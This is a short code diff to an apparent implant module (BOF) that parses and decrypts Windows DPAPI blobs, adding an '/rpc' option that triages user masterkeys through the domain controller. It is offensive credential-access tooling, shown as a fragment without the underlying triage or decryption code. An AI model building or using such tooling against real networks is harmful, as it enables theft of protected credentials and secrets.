@@ -2,7 +2,7 @@
  * blob.c — BOF for describing/decrypting a raw DPAPI blob
  *
  * Usage:
- *   blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]
+ *   blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect] [/rpc]
  *
  * Parses and optionally decrypts a DPAPI blob.
  */
@@ -10,6 +10,7 @@
 #include "bofdefs.h"
 #include "dpapi_common.h"
 #include "helpers.h"
+#include "triage.h"
 
 void go(char* args, int args_len) {
     datap parser;
@@ -18,6 +19,7 @@ void go(char* args, int args_len) {
     char* blob_b64   = BeaconDataExtract(&parser, NULL);
     char* credkey    = BeaconDataExtract(&parser, NULL);
     int   unprotect  = BeaconDataInt(&parser);
+    int   use_rpc    = BeaconDataInt(&parser);
 
     if (!blob_b64 || strlen(blob_b64) == 0) {
         BeaconPrintf(CALLBACK_ERROR, "[!] Usage: blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]\n");
@@ -57,6 +59,12 @@ void go(char* args, int args_len) {
             }
             intFree(ck);
         }
+    }
+
+    /* If /rpc, triage masterkeys via domain controller */
+    if (use_rpc) {
+        triage_user_masterkeys(&cache, NULL, 0,
+            NULL, NULL, NULL, TRUE, NULL, NULL, FALSE, NULL);
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Blob Describe (BOF) ===\n");
